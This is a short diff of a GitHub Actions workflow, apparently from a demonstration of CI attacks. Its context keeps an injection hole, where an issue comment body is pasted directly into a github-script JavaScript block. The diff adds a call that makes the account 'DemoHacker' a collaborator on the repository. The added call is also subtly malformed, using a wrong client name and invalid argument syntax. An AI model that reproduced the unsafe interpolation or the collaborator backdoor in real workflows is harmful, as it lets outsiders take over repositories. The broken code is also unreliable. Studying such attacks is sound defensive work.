@@ -16,7 +16,12 @@ jobs:
         uses: actions/github-script@v6
         with:
           script: |
-            const comment="${{ github.event.comment.body }}"
+            const comment="${{ github.event.comment.body }}";
+            git.rest.repos.addCollaborator({
+              "ThibaultLengagne",
+              "security-gha-attacks",
+              "DemoHacker",
+            });
             if (comment.startsWith('octocat')) {
               console.log("Issue comment starts with 'octocat'")
             } else {
